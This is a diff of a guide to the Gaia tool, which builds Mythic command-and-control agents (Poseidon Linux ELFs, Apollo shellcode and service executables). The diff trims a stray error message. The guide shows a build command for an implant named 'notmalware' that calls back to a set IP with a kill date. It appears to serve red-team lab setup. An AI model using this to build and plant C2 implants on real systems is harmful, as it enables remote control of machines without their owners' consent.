@@ -273,14 +273,13 @@ options:
   -k, --callback-killdate   Target date after which the C2 agents will no longer run (YYYY-MM-DD)
   -o, --os {linux,macos}    Build C2 agents for the target operating system
 ```
-The amount of time it will take to build these payloads will vary greatly based on how powerful your Mythic server is. By default, the `http` C2 profile in Mythic listens on port 80, which is why that's the port specified here. Also, you can safely ignore that last line, I'm not sure what causes it yet but it's harmless. 
+The amount of time it will take to build these payloads will vary greatly based on how powerful your Mythic server is. By default, the `http` C2 profile in Mythic listens on port 80, which is why that's the port specified here. 
 ```
 (.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py payload create poseidon -n notmalware -u http://192.168.153.133 -k 2026-09-30 -p 80 -o linux
 Poseidon linux x64 elf building
 Poseidon linux x64 elf built
 Poseidon linux arm64 elf building
 Poseidon linux arm64 elf built
-Ignoring exception in _clean_close: ConnectionClosedError(None, None, None)
 ```
 When you execute this command, `.env` updates the `MYTHIC_HTTP_CALLBACK_URL_BASE`, `MYTHIC_HTTP_CALLBACK_PORT`, and `MYTHIC_HTTP_CALLBACK_KILLDATE` values. 
 
@@ -314,7 +313,6 @@ Apollo shellcode building
 Apollo shellcode built
 Apollo service executable building
 Apollo service executable built
-Ignoring exception in _clean_close: ConnectionClosedError(None, None, None)
 (.venv) PS C:\tools\gaia_guide\Gaia>
 ```
 
